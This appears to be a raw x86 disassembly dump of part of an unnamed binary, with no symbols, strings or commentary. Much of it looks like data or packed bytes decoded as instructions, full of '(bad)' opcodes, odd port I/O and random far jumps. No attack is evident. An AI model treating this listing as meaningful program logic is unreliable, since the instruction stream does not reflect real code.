  406bfd:	add    cl,BYTE PTR [eax]
  406bff:	add    DWORD PTR [eax+0x480018d],0x228840
  406c09:	add    BYTE PTR [ebx+eiz*2],al
  406c0c:	adc    eax,0x40008104
  406c11:	and    al,BYTE PTR [eax]
  406c13:	add    BYTE PTR [eax+0x12800000],al
  406c19:	add    BYTE PTR [eax+0x8],al
  406c1c:	adc    BYTE PTR [edx+eax*2+0x2a],al
  406c20:	add    al,BYTE PTR [eax]
  406c22:	imul   eax,DWORD PTR [eax],0xca1a0440
  406c28:	and    BYTE PTR [eax+0x19200000],al
  406c2e:	add    BYTE PTR [eax],al
  406c30:	inc    esi
  406c31:	push   es
  406c32:	add    BYTE PTR [ebp-0x7efffcc0],al
  406c38:	mov    BYTE PTR [eax],al
  406c3a:	and    BYTE PTR [eax],cl
  406c3c:	adc    BYTE PTR [eax+eax*4],cl
  406c3f:	push   eax
  406c40:	popa   
  406c41:	or     DWORD PTR [edi],eax
  406c43:	or     BYTE PTR [eax+0x0],ah
  406c46:	rcl    BYTE PTR [eax],1
  406c48:	add    BYTE PTR [eax],al
  406c4a:	add    BYTE PTR [eax],al
  406c4c:	adc    DWORD PTR [eax+0x23],eax
  406c4f:	add    BYTE PTR [esp],al
  406c52:	bound  eax,QWORD PTR [esi+0x63]
  406c55:	and    BYTE PTR [eax],cl
  406c57:	add    al,BYTE PTR [edx-0x70]
  406c5a:	inc    ecx
  406c5b:	adc    BYTE PTR [eax],0x2
  406c5e:	add    eax,DWORD PTR [eax]
  406c60:	shl    DWORD PTR [ebx],0x1
  406c63:	add    al,0xbe
  406c65:	add    BYTE PTR [eax-0x5b],bl
  406c68:	inc    ebp
  406c69:	add    BYTE PTR [eax+0x124c0220],dl
  406c6f:	add    BYTE PTR [eax],al
  406c71:	cmp    dl,BYTE PTR [edx]
  406c73:	and    BYTE PTR [eax],al
  406c75:	or     BYTE PTR [eax],al
  406c77:	add    DWORD PTR ds:0x2200060,ecx
  406c7d:	add    BYTE PTR [edx],al
  406c7f:	and    BYTE PTR [eax+0x40],ch
  406c82:	add    BYTE PTR [eax+0x8],cl
  406c85:	inc    eax
  406c86:	inc    eax
  406c87:	rcl    DWORD PTR [edx+esi*1+0xb804440],0x18
  406c8f:	inc    eax
  406c90:	pusha  
  406c91:	adc    BYTE PTR [edx],al
  406c93:	xchg   edx,eax
  406c94:	add    al,0x21
  406c96:	rol    BYTE PTR [eax],1
  406c98:	test   BYTE PTR [eax],dl
  406c9a:	sub    DWORD PTR [edx+0x0],esi
  406c9d:	add    BYTE PTR [eax],0x0
  406ca0:	and    DWORD PTR [eax+0x1b],eax
  406ca3:	ror    BYTE PTR [ebp-0x7f3fbf00],0x2
  406caa:	add    DWORD PTR [eax],esi
  406cac:	add    bl,BYTE PTR [eax-0x7f9d8000]
  406cb2:	add    BYTE PTR [edx],dl
  406cb4:	add    cl,BYTE PTR [ecx]
  406cb6:	add    al,0x10
  406cb8:	add    BYTE PTR [eax],al
  406cba:	add    BYTE PTR [edi],dh
  406cbc:	inc    esp
  406cbd:	adc    BYTE PTR [eax+0x11],al
  406cc0:	enter  0x188,0x10
  406cc4:	loopne 0x406c6f
  406cc6:	and    BYTE PTR [ecx],al
  406cc8:	inc    edx
  406cc9:	inc    eax
  406cca:	mov    BYTE PTR [eax],dl
  406ccc:	add    eax,DWORD PTR [eax]
  406cce:	add    al,BYTE PTR [ecx]
  406cd0:	adc    BYTE PTR [eax],al
  406cd2:	add    DWORD PTR [edx+0x12000800],edx
  406cd8:	or     BYTE PTR [edx+edi*1],ah
  406cdb:	or     BYTE PTR [ecx+0x28],al
  406cde:	add    al,BYTE PTR [edi]
  406ce0:	sbb    BYTE PTR [eax],al
  406ce2:	add    BYTE PTR [eax+eax*1],al
  406ce5:	push   eax
  406ce6:	add    BYTE PTR [eax],ah
  406ce8:	push   ss
  406ce9:	adc    eax,eax
  406ceb:	jp     0x406d31
  406ced:	add    BYTE PTR [eax-0x7f9b3fff],al
  406cf3:	or     BYTE PTR [eax],al
  406cf5:	mov    al,ds:0x84290800
  406cfa:	add    BYTE PTR [ecx+0x7],bl
  406cfd:	and    BYTE PTR [ecx],al
  406cff:	add    BYTE PTR [ebx*2-0x5cffedd6],0xb0
  406d07:	add    BYTE PTR [eax],al
  406d09:	test   DWORD PTR [edx],edx
  406d0b:	add    BYTE PTR [eax+0x48],al
  406d0e:	and    BYTE PTR [ecx],0x7
  406d11:	add    BYTE PTR [eax],al
  406d13:	add    al,BYTE PTR [ecx+0x80045]
  406d19:	add    DWORD PTR [ecx],esp
  406d1b:	and    DWORD PTR [ebp+0x8],edx
  406d1e:	add    BYTE PTR [ebp-0x76],al
  406d21:	add    BYTE PTR [eax],dl
  406d23:	or     BYTE PTR [esi],dl
  406d25:	add    al,0xb8
  406d27:	inc    eax
  406d28:	add    al,BYTE PTR [edx]
  406d2a:	inc    esp
  406d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d2c:	adc    BYTE PTR [edx-0x4befe000],0x0
  406d33:	xchg   edx,eax
  406d34:	add    al,cl
  406d36:	inc    eax
  406d37:	dec    ecx
  406d38:	sub    BYTE PTR [eax+0x484035],dl
  406d3e:	add    BYTE PTR [ecx],ah
  406d40:	add    ah,BYTE PTR [edi]
  406d42:	dec    edx
  406d43:	inc    ecx
  406d44:	or     al,BYTE PTR [eax]
  406d46:	inc    esp
  406d47:	add    BYTE PTR [eax],cl
  406d49:	add    BYTE PTR [edx+0x40],bl
  406d4c:	add    BYTE PTR [eax],0x41
  406d4f:	add    BYTE PTR [eax],al
  406d51:	add    BYTE PTR [eax+0x0],al
  406d54:	adc    eax,0xd3a94000
  406d59:	and    DWORD PTR [eax],0x4026648
  406d5f:	add    al,BYTE PTR [edx+0x130442]
  406d65:	test   BYTE PTR [edx],bl
  406d67:	or     BYTE PTR [edx-0x7bdfb9c0],0x0
  406d6e:	nop
  406d6f:	add    al,0xa
  406d71:	sbb    BYTE PTR [eax+ebp*4],dl
  406d74:	inc    eax
  406d75:	adc    DWORD PTR [eax],eax
  406d77:	inc    eax
  406d78:	or     eax,DWORD PTR [ecx+0x5002000]
  406d7e:	nop
  406d7f:	inc    eax
  406d80:	push   es
  406d81:	nop
  406d82:	xor    BYTE PTR [eax+0xad0040],dl
  406d88:	add    BYTE PTR [edx+0x18053200],dl
  406d8e:	leave  
  406d8f:	add    BYTE PTR [eax],al
  406d91:	test   BYTE PTR [edx],al
  406d93:	and    BYTE PTR [edx],ah
  406d95:	add    BYTE PTR [eax],al
  406d97:	shl    DWORD PTR [edx+0x242000c8],1
  406d9d:	add    BYTE PTR [edx],0x23
  406da0:	and    BYTE PTR [eax+0x0],al
  406da3:	inc    eax
  406da4:	and    BYTE PTR [eax],al
  406da6:	add    BYTE PTR [eax],al
  406da8:	mov    edx,0x10a00020
  406dad:	adc    al,0x0
  406daf:	or     BYTE PTR [eax],al
  406db1:	add    BYTE PTR [edx-0x60],al
  406db4:	and    BYTE PTR [eax+0x10],al
  406db7:	add    BYTE PTR [ecx],dl
  406db9:	or     BYTE PTR [eax],0x1
  406dbc:	inc    eax
  406dbd:	add    BYTE PTR [edx],dl
  406dbf:	add    BYTE PTR [edx],al
  406dc1:	add    DWORD PTR [eax],eax
  406dc3:	and    BYTE PTR [eax+0x20],cl
  406dc6:	sbb    BYTE PTR [ecx+eax*2],ah
  406dc9:	and    BYTE PTR [eax],al
  406dcb:	add    BYTE PTR [ebx*1+0x58002508],cl
  406dd2:	inc    eax
  406dd3:	or     BYTE PTR [ecx],bl
  406dd5:	and    BYTE PTR [eax+0x20],al
  406dd8:	add    BYTE PTR [ecx+eax*1],al
  406ddb:	add    BYTE PTR [eax+0x4102005c],al
  406de1:	adc    BYTE PTR [eax+ecx*1],ah
  406de4:	add    BYTE PTR [eax],al
  406de6:	add    BYTE PTR [eax],ah
  406de8:	and    al,BYTE PTR [eax+0x2]
  406deb:	push   es
  406dec:	add    BYTE PTR [eax+0x10a208],al
  406df2:	sub    BYTE PTR [ebx+0x2000258],al
  406df8:	sbb    ah,BYTE PTR [eax+0x0]
  406dfb:	add    BYTE PTR [eax],al
  406dfd:	xor    al,0x44
  406dff:	and    al,0xa4
  406e01:	add    al,BYTE PTR [eax]
  406e03:	outs   dx,BYTE PTR ds:[esi]
  406e04:	or     BYTE PTR [eax],ah
  406e06:	and    BYTE PTR [eax],dl
  406e08:	adc    al,BYTE PTR [eax]
  406e0a:	or     BYTE PTR [eax+0x40],ah
  406e0d:	and    BYTE PTR [eax],al
  406e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e10:	adc    DWORD PTR [eax],eax
  406e12:	sub    al,0x50
  406e14:	adc    BYTE PTR [eax+0x10],0x21
  406e18:	add    BYTE PTR [eax],al
  406e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e1b:	or     BYTE PTR [eax+0x64c30080],al
  406e21:	add    BYTE PTR [eax],al
  406e23:	adc    al,0x40
  406e25:	inc    eax
  406e26:	xchg   ecx,eax
  406e27:	sbb    BYTE PTR [eax+0x2800000],al
  406e2d:	add    BYTE PTR [edx],al
  406e2f:	loope  0x406df1
  406e31:	add    BYTE PTR [esi],dl
  406e33:	adc    al,BYTE PTR ds:0x42500482
  406e39:	pusha  
  406e3a:	jecxz  0x406e3c
  406e3c:	test   BYTE PTR [eax+0xd],al
  406e3f:	sbb    BYTE PTR [eax],al
  406e41:	shl    BYTE PTR [eax],0x83
  406e44:	add    BYTE PTR [edx+0x5],dl
  406e47:	add    BYTE PTR [eax+eax*4],dh
  406e4a:	add    DWORD PTR [eax-0x40],ebx
  406e4d:	add    DWORD PTR [ecx],eax
  406e4f:	add    BYTE PTR [edx],al
  406e51:	inc    edx
  406e52:	add    BYTE PTR [esp+ecx*4],cl
  406e55:	inc    esp
  406e56:	mov    BYTE PTR [eax],ah
  406e58:	add    DWORD PTR [edx],eax
  406e5a:	arpl   WORD PTR [eax],ax
  406e5c:	jecxz  0x406e9e
  406e5e:	adc    BYTE PTR [eax+0x0],al
  406e61:	inc    eax
  406e62:	xchg   BYTE PTR [eax-0x60],al
  406e65:	add    al,0x0
  406e67:	xor    BYTE PTR [eax+0x0],al
  406e6a:	sbb    BYTE PTR [ecx+0x4140003],al
  406e70:	or     BYTE PTR [eax+0x1400a4c],0x8
  406e77:	add    BYTE PTR [edx],al
  406e79:	adc    BYTE PTR [ebp-0x7b],al
  406e7c:	sub    BYTE PTR [eax-0x1a],ah
  406e7f:	add    al,0x20
  406e81:	add    BYTE PTR [edx+0x1108c000],ah
  406e87:	sbb    BYTE PTR [edx],al
  406e89:	adc    dl,BYTE PTR [eax]
  406e8b:	shl    DWORD PTR [ebx],0x20
  406e8e:	or     eax,DWORD PTR [eax+esi*1+0x2]
  406e92:	adc    BYTE PTR [eax],al
  406e94:	add    BYTE PTR [eax],0xc1
  406e97:	or     al,BYTE PTR [eax+0xd]
  406e9a:	add    al,BYTE PTR [eax]
  406e9c:	add    BYTE PTR [eax+eax*1],ah
  406e9f:	sbb    ah,BYTE PTR [ebx+0x0]
  406ea2:	add    BYTE PTR [ecx+eax*4],al
  406ea5:	add    DWORD PTR [eax],0x0
  406ea8:	dec    eax
	...
  406eed:	add    BYTE PTR [eax],al
  406eef:	add    bh,bh
  406ef1:	aad    0x3a
  406ef3:	sbb    edx,DWORD PTR [ebp-0x7f6d1846]
  406ef9:	pop    ebx
  406efa:	je     0x406f31
  406efc:	lahf   
  406efd:	aaa    
  406efe:	in     eax,dx
  406eff:	push   ss
  406f00:	ds out 0x22,eax
  406f03:	sbb    al,0xf
  406f06:	shl    BYTE PTR [esi+0x7e],0x61
  406f0a:	mov    BYTE PTR [edx-0x22],al
  406f0d:	add    eax,DWORD PTR [esi+ebx*2+0x629039d8]
  406f14:	div    cl
  406f16:	mov    esi,0x5171ce84
  406f1b:	test   BYTE PTR [esi],bh
  406f1d:	fwait
  406f1e:	sub    ecx,eax
  406f20:	es jo  0x406f75
  406f23:	test   BYTE PTR [esi],bh
  406f25:	out    0x2,eax
  406f27:	sbb    al,0xe8
  406f29:	sub    eax,0x3ff4845a
  406f2e:	mov    esi,0x3c2f6258
  406f33:	loopne 0x406f73
  406f35:	cmp    eax,DWORD PTR [edx-0x4dc019a4]
  406f3b:	dec    esp
  406f3c:	out    0x3f,al
  406f3e:	push   es
  406f3f:	dec    esp
  406f40:	sub    BYTE PTR [esi],bh
  406f42:	pop    ebx
  406f43:	cs mov esi,0x28e29bf0
  406f49:	jl     0x406f3b
  406f4b:	xchg   esp,eax
  406f4c:	scas   al,BYTE PTR es:[edi]
  406f4d:	or     al,0x42
  406f4f:	repnz retf 
  406f51:	mov    edx,0xf1a1924f
  406f56:	mov    cl,0x7e
  406f58:	stos   BYTE PTR es:[edi],al
  406f59:	or     ch,al
  406f5b:	sar    DWORD PTR [edx],cl
  406f5d:	arpl   dx,di
  406f5f:	loope  0x406efd
  406f61:	ss cmp eax,0xbca75495
  406f67:	mov    fs,ebp
  406f69:	sbb    bl,BYTE PTR [ebp-0xb]
  406f6c:	fsub   DWORD PTR [edx]
  406f6e:	int    0x6f
  406f70:	lahf   
  406f71:	hlt    
  406f72:	sub    DWORD PTR [ebx+0x6],0x25
  406f76:	ror    ah,cl
  406f78:	das    
  406f79:	out    0xc8,eax
  406f7b:	add    edi,esp
  406f7d:	in     al,0xf1
  406f7f:	xchg   edx,eax
  406f80:	ret    
  406f81:	sbb    bl,dl
  406f83:	jne    0x406f35
  406f85:	in     al,dx
  406f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f87:	inc    ebp
  406f88:	rcr    DWORD PTR [eax],0xab
  406f8b:	jns    0x406fcb
  406f8d:	out    0x5a,eax
  406f8f:	test   BYTE PTR [esi],ch
  406f91:	out    0x5c,eax
  406f93:	jg     0x407006
  406f95:	out    0x44,al
  406f97:	mov    WORD PTR [eax],gs
  406f99:	or     al,0x5a
  406f9b:	test   BYTE PTR [ebp-0x1a],al
  406f9e:	dec    edx
  406f9f:	sahf   
  406fa0:	rcl    DWORD PTR [ebp+eiz*4+0x5ae73e7b],0x86
  406fa8:	mov    esp,0x8afd0203
  406fad:	or     DWORD PTR [esi-0x4],edx
  406fb0:	(bad)  
  406fb1:	mov    dl,0x5f
  406fb3:	(bad)  
  406fb5:	cmc    
  406fb6:	dec    esi
  406fb7:	add    al,0x36
  406fb9:	loop   0x406f84
  406fbb:	call   0xe655:0x845b313e
  406fc2:	xchg   esp,eax
  406fc3:	lahf   
  406fc4:	shl    DWORD PTR [eax-0x1b3e845c],0xa6
  406fcb:	sub    edx,0xffffffe7
  406fce:	mov    dh,0x62
  406fd0:	jmp    0x2d9566ee
  406fd5:	in     al,dx
  406fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd7:	jnp    0x406f9a
  406fd9:	sbb    BYTE PTR [ebx-0x6d78ea87],ah
  406fdf:	xchg   edx,eax
  406fe0:	ds icebp 
  406fe2:	pop    ebx
  406fe3:	test   BYTE PTR [eax],ch
  406fe5:	inc    edx
  406fe6:	(bad)  
  406fe7:	pushf  
  406fe8:	mov    esi,DWORD PTR [eax]
  406fea:	inc    ebx
  406feb:	xchg   edx,eax
  406fec:	sbb    edx,DWORD PTR [ecx-0xe5d6daa]
  406ff2:	std    
  406ff3:	ins    DWORD PTR es:[edi],dx
  406ff4:	and    al,0x9c
  406ff6:	mov    edi,0x5b18c1e4
  406ffb:	jp     0x407039
  406ffd:	out    0x28,eax
  406fff:	test   edx,edx
  407001:	push   cs
  407002:	pop    edx
  407003:	xchg   edx,eax
  407004:	fs sahf 
  407006:	mov    cl,BYTE PTR [ecx+0x32]
  407009:	lahf   
  40700a:	fsub   DWORD PTR [eax+0x3a]
  40700d:	mov    edi,0x672b6aee
  407012:	fwait
  407013:	shr    DWORD PTR [edi+ecx*1-0x314714e],1
  40701a:	repz push ebx
  40701c:	rcr    BYTE PTR [eax],0x31
  40701f:	test   edx,eax
  407021:	loopne 0x406fc8
  407023:	rcl    edx,cl
  407025:	ins    DWORD PTR es:[edi],dx
  407026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407027:	xchg   DWORD PTR [edx-0x3e7b70c9],edx
  40702d:	sbb    BYTE PTR [ecx+0x7a],bh
  407030:	(bad)  
  407031:	sbb    ch,BYTE PTR ds:0xa58dd58e
  407037:	jnp    0x407047
  407039:	cmc    
  40703a:	dec    ebp
  40703b:	add    ebx,eax
  40703d:	sbb    BYTE PTR [ecx+0x75],dl
  407040:	sub    ah,ch
  407042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407043:	inc    edi
  407044:	rcr    DWORD PTR [eax],0xab
  407047:	jns    0x407080
  407049:	out    0xc8,eax
  40704b:	add    edi,esp
  40704d:	xor    al,0x92
  407050:	dec    esp
  407051:	ins    DWORD PTR es:[edi],dx
  407052:	fiadd  DWORD PTR [ebp-0x56]
  407055:	icebp  
  407056:	dec    ebx
  407057:	ins    BYTE PTR es:[edi],dx
  407058:	cmp    BYTE PTR [ecx-0x20],dl
  40705b:	xchg   esp,eax
  40705c:	mov    DWORD PTR [edi],edx
  40705e:	and    dl,BYTE PTR [edx+0x3e5df12e]
  407064:	cmp    BYTE PTR ds:0x909ac4bc,cl
  40706a:	dec    edx
  40706b:	loop   0x407045
  40706d:	test   esp,edi
  40706f:	mov    ah,0xb4
  407071:	test   DWORD PTR [eax],0x8f379e83
  407077:	test   cl,al
  407079:	sbb    cl,dl
  40707b:	jns    0x4070a3
  40707d:	movaps xmm1,XMMWORD PTR [esi]
  407080:	call   0x3940cdad
  407085:	inc    ecx
  407086:	clc    
  407087:	inc    ecx
  407088:	xchg   esp,eax
  407089:	not    DWORD PTR [edx]
  40708b:	cmp    BYTE PTR [ebx],0x65
  40708e:	inc    ebp
  40708f:	jmp    0xf7b4:0x819a6138
  407096:	bound  eax,QWORD PTR [edx-0x7ab392c8]
  40709c:	mov    bh,0xaf
  40709e:	dec    edx
  40709f:	xchg   esi,eax
  4070a0:	lods   al,BYTE PTR ds:[esi]
  4070a1:	bound  esp,QWORD PTR [ebx+0x46]
  4070a4:	xchg   esp,eax
  4070a5:	icebp  
  4070a6:	dec    ebx
  4070a7:	test   ch,dl
  4070a9:	inc    DWORD PTR [edx-0x5ac8d185]
  4070af:	outs   dx,DWORD PTR ds:[esi]
  4070b0:	rcr    DWORD PTR [eax],0x6b
  4070b3:	jnp    0x4070ec
  4070b5:	scas   eax,DWORD PTR es:[edi]
  4070b6:	enter  0x768b,0xf7
  4070ba:	push   esp
  4070bb:	or     eax,0x8dde4d3e
  4070c0:	cmp    DWORD PTR [esi+0x4d],ebp
  4070c3:	pop    ebp
  4070c4:	out    dx,al
  4070c5:	out    0x82,al
  4070c7:	inc    ebp
  4070c8:	ds in  eax,0x5b
  4070cb:	test   BYTE PTR [edx],bl
  4070cd:	rol    BYTE PTR [edx],0xcc
  4070d0:	mov    ch,bh
  4070d2:	fild   DWORD PTR [ebp+ebx*1-0x1186a399]
  4070d9:	fcomp  QWORD PTR [ebx+0x24]
  4070dc:	shl    esp,0xa7
  4070df:	jnp    0x4070d0
  4070e1:	dec    ecx
  4070e2:	sar    DWORD PTR [ecx+edx*2+0x19],1
  4070e6:	mov    ebx,0xb05cefcc
  4070eb:	jl     0x4070ae
  4070ed:	hlt    
  4070ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ef:	jnp    0x4070e0
  4070f1:	jae    0x4070c3
  4070f3:	je     0x4070c6
  4070f5:	sbb    BYTE PTR [ecx-0x55],bh
  4070f8:	out    dx,eax
  4070f9:	jl     0x4070ab
  4070fb:	jl     0x4070be
  4070fd:	hlt    
  4070fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ff:	jnp    0x40712a
  407101:	ins    BYTE PTR es:[edi],dx
  407102:	shr    BYTE PTR [esi+edi*4-0x61],1
  407106:	mov    ds:0x44cf9f83,al
  40710b:	jmp    0xe126:0xd40d73a
  407112:	dec    esp
  407113:	and    eax,0x7cf04c2d
  407118:	sahf   
  407119:	(bad)  
  40711a:	mov    edx,0x49f0e683
  40711f:	das    
  407120:	sub    DWORD PTR [eax+eiz*4],ecx
  407123:	pop    esp
  407124:	ror    BYTE PTR [esi],1
  407126:	mov    edx,0x913747f3
  40712b:	fsubr  QWORD PTR [ecx]
  40712d:	jmp    0xd40:0xef5e6ab0
  407134:	into   
  407135:	or     al,0x2c
  407137:	push   cs
  407138:	jg     0x407121
  40713a:	xor    bh,0x24
  40713d:	dec    edx
  40713e:	pop    edx
  40713f:	test   dl,dh
  407141:	in     eax,0xa1
  407143:	adc    DWORD PTR [edi+ecx*1],ebp
  407146:	cs push eax
  407148:	shl    DWORD PTR [eax],cl
  40714a:	push   ebx
  40714b:	inc    eax
  40714c:	ds xchg edx,eax
  40714e:	jmp    0x246f:0x8bf10e11
  407155:	jle    0x407125
  407157:	xchg   BYTE PTR [eax+0x7d],cl
  40715a:	js     0x4070ea
  40715c:	es xchg ecx,eax
  40715e:	mov    edx,0xc0e9d961
  407163:	pop    esp
  407164:	(bad)  
  407165:	push   cs
  407166:	sub    al,0x1e
  407168:	dec    ebx
  407169:	in     al,0x5f
  40716b:	push   edx
  40716c:	pop    ds
  40716d:	(bad)  
  40716e:	das    
  40716f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407170:	adc    dh,cl
  407172:	jnp    0x4071e1
  407174:	fiadd  WORD PTR [esi]
  407176:	pop    edi
  407177:	into   
  407178:	inc    ebp
  407179:	inc    edi
  40717a:	mov    edx,0xfa0d9e65
  40717f:	and    al,0xcb
  407181:	sbb    edx,DWORD PTR [edi-0x7c]
  407184:	xor    al,0x31
  407186:	lea    ebp,[ebp-0x45]
  407189:	out    dx,al
  40718a:	rol    BYTE PTR [ebx+0x21a575fd],cl
  407190:	ds dec ebp
  407192:	fimul  WORD PTR [ebp+0x5d4df1ff]
  407198:	sub    BYTE PTR [eax+esi*4],bl
  40719b:	pushf  
  40719c:	pop    ebx
  40719d:	out    0x4b,al
  40719f:	jl     0x407218
  4071a1:	cmp    BYTE PTR ds:0x5ee7e532,0x54
  4071a8:	fmul   DWORD PTR [ebx]
  4071aa:	pop    ebx
  4071ab:	test   bh,ch
  4071ad:	cs cmp al,0x16
  4071b0:	add    DWORD PTR ds:[edx-0x7c],ebx
  4071b4:	mov    esi,0x3ee26336
  4071b9:	out    0xec,eax
  4071bb:	test   BYTE PTR [eax-0x1e],bl
  4071be:	mov    esp,0xd9371fc2
  4071c3:	in     al,0x3e
  4071c5:	out    0xc4,eax
  4071c7:	test   cl,bl
  4071c9:	or     DWORD PTR [edi+0x4],edi
  4071cc:	push   0x30
  4071ce:	mov    cl,0xfa
  4071d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071d1:	out    0xf2,eax
  4071d3:	push   ebp
  4071d4:	push   0xee845b71
  4071d9:	bound  esi,QWORD PTR [eax+0x5b313ea4]
  4071df:	test   BYTE PTR [ebp+0x18dc0b36],bl
  4071e5:	jne    0x40719a
  4071e7:	push   ds
  4071e8:	sbb    al,0x76
  4071ea:	mov    WORD PTR [ebp+0x45d9bf2f],?
  4071f0:	ds out 0x8a,eax
  4071f3:	fnstsw WORD PTR [esi]
  4071f5:	sbb    eax,0xf3d8fe5a
  4071fa:	pop    edx
  4071fb:	test   BYTE PTR ds:0xcf7d5a01,dh
  407201:	sbb    BYTE PTR [esi-0x7e],dl
  407204:	mov    esp,0xb580b465
  407209:	xor    BYTE PTR [ecx-0x6d],0x28
  40720d:	or     BYTE PTR [ecx+0x28],bl
  407210:	fldcw  WORD PTR [esi-0x1ddc9bf3]
  407216:	out    0x52,al
  407218:	xor    al,0xf3
  40721a:	jmp    FWORD PTR [edi+0x1a]
  40721d:	inc    ebx
  40721e:	ja     0x407228
  407220:	lods   al,BYTE PTR ds:[esi]
  407221:	fs fsubr st(3),st
  407224:	rcr    DWORD PTR [eax],0x8b
  407227:	pop    ecx
  407228:	lods   al,BYTE PTR ds:[esi]
  407229:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40722b:	mov    ds:0x7b9518c1,eax
  407230:	mov    ecx,0x6e60beb0
  407235:	cmc    
  407236:	mov    ds:0xa22506cc,eax
  40723b:	int3   
  40723c:	das    
  40723d:	out    0xc8,eax
  40723f:	add    edi,esp
  407241:	loopne 0x407234
  407243:	xchg   edx,eax
  407244:	push   ecx
  407246:	shl    DWORD PTR [ebp+0x74],cl
  407249:	out    0xd0,eax
  40724b:	xchg   esp,eax
  40724c:	shr    DWORD PTR [edx],0xba
  40724f:	jnp    0x4071f5
  407251:	push   ebx
  407252:	pop    eax
  407253:	cmc    
  407254:	sub    BYTE PTR [esi-0x50],al
  407257:	mov    ds:0x8622e6cb,al
  40725c:	add    DWORD PTR ds:[edx-0x7c],edi
  407260:	cmp    al,0x9e
  407262:	dec    edx
  407263:	dec    eax
  407264:	mov    ah,0xf
  407266:	pop    esi
  407267:	and    al,0x3e
  407269:	(bad)  
  40726a:	push   esp
  40726b:	fsubp  st(0),st
  40726d:	pop    eax
  40726e:	pop    ebx
  40726f:	test   BYTE PTR [esi],ch
  407271:	aaa    
  407272:	dec    ecx
  407273:	(bad)  
  407275:	out    0x5a,eax
  407277:	test   BYTE PTR [esi-0x67],dh
  40727a:	pop    eax
  40727b:	fnstsw WORD PTR [esi]
  40727d:	push   ecx
  40727e:	jo     0x407284
  407280:	ffree  st(4)
  407282:	inc    eax
  407283:	sbb    DWORD PTR [esi-0x3e7b24c9],0x18
  40728a:	mov    ebx,0x4994de7d
  40728f:	(bad)  
  407291:	out    0xa,eax
  407293:	mov    BYTE PTR [ebp+0x2c925cc4],al
  407299:	jl     0x407275
  40729b:	test   BYTE PTR [esi+0x3e51aa37],bh
  4072a1:	out    0x5a,eax
  4072a3:	in     al,0x3e
  4072a5:	aaa    
  4072a6:	clc    
  4072a7:	push   eax
  4072a8:	mov    ds:0xde9ecef4,al
  4072ad:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4072af:	outs   dx,DWORD PTR ds:[esi]
  4072b0:	rcr    DWORD PTR [eax],0xbf
  4072b3:	jg     0x40727b
  4072b5:	cld    
  4072b6:	dec    ecx
  4072b7:	nop    DWORD PTR [edi+0x3c]
  4072bb:	add    eax,0x925b1fc5
  4072c0:	into   
  4072c1:	loopne 0x40730f
  4072c3:	pop    ds
  4072c4:	add    BYTE PTR [eax],0xe5
  4072c7:	sar    DWORD PTR [ecx],cl
  4072c9:	(bad)  
  4072ca:	adc    ebx,DWORD PTR [edi+0x471193e]
  4072d0:	pop    ecx
  4072d1:	ss fwait
  4072d3:	lahf   
  4072d4:	sbb    DWORD PTR ds:[ebp+0x4],esi
  4072d8:	sbb    eax,0xee3f3c67
  4072dd:	pop    edx
  4072de:	pop    edx
  4072df:	sub    cl,al
  4072e1:	nop
  4072e2:	mov    ds:0x5c671d7b,al
  4072e7:	inc    edi
  4072e8:	xor    al,0xa0
  4072ea:	pop    edx
  4072eb:	call   0x671d:0x845f193e
  4072f2:	cmp    al,0x4f
  4072f4:	mov    esi,0x46505a37
  4072f9:	sbb    BYTE PTR [eax],bh
  4072fb:	ins    BYTE PTR es:[edi],dx
  4072fc:	fidiv  WORD PTR [esi]
  4072fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ff:	outs   dx,DWORD PTR ds:[esi]
  407300:	rcr    DWORD PTR [eax],0x1f
  407303:	jg     0x4072db
  407305:	lock dec eax
  407307:	(bad)  
  407309:	loopne 0x4072e5
  40730b:	fwait
  40730c:	ds icebp 
  40730e:	pop    edi
  40730f:	test   BYTE PTR [eax-0x3ed654c9],dl
  407315:	sbb    BYTE PTR [ebp+0x2cc4f578],ch
  40731b:	and    BYTE PTR [eax],0xed
  40731e:	fild   DWORD PTR [esi+edi*1-0x11787919]
  407325:	retf   0x2afa
  407328:	rcl    DWORD PTR [eax+0x671d7ba2],0x5c
  40732f:	push   edi
  407330:	xor    al,0x50
  407332:	pop    ebx
  407333:	call   0x1c28:0x8459f13e
  40733a:	mov    al,0x94
  40733c:	inc    edi
  40733d:	out    0xb2,eax
  40733f:	test   DWORD PTR [edi+edi*8+0x5a],0x29013a84
  407347:	pusha  
  407348:	aad    0xf7
  40734a:	adc    dl,BYTE PTR [ebx+0x7f4ce0d6]
  407350:	cmp    BYTE PTR [ebx],cl
  407352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407353:	cld    
  407354:	sub    BYTE PTR [edx+0x22],ch
  407357:	dec    eax
  407358:	sub    al,0x68
  40735a:	jbe    0x4073a4
  40735c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40735d:	emms   
  40735f:	xchg   edx,eax
  407360:	inc    esi
  407361:	xor    ebx,DWORD PTR [esi+edx*1-0x16]
  407365:	addr16 pop edx
  407367:	sub    al,0x9e
  407369:	sbb    DWORD PTR [ebp-0x4f461199],esp
  40736f:	xchg   esp,eax
  407370:	push   ds
  407371:	sbb    DWORD PTR [ebp-0x4f4f1078],eax
  407377:	rcl    DWORD PTR fs:[esi-0x60],0x7b
  40737c:	cs icebp 
  40737e:	dec    ebp
  40737f:	jg     0x4073aa
  407381:	jp     0x407334
  407383:	ins    BYTE PTR es:[edi],dx
  407384:	inc    esi
  407385:	icebp  
  407386:	pop    ebp
  407387:	sbb    al,bl
  407389:	scas   al,BYTE PTR es:[edi]
  40738a:	leave  
  40738b:	sub    al,0x2e
  40738d:	loope  0x4073db
  40738f:	aas    
  407390:	and    BYTE PTR [ecx-0x76df0313],cl
  407396:	int    0x88
  407398:	and    al,0xe
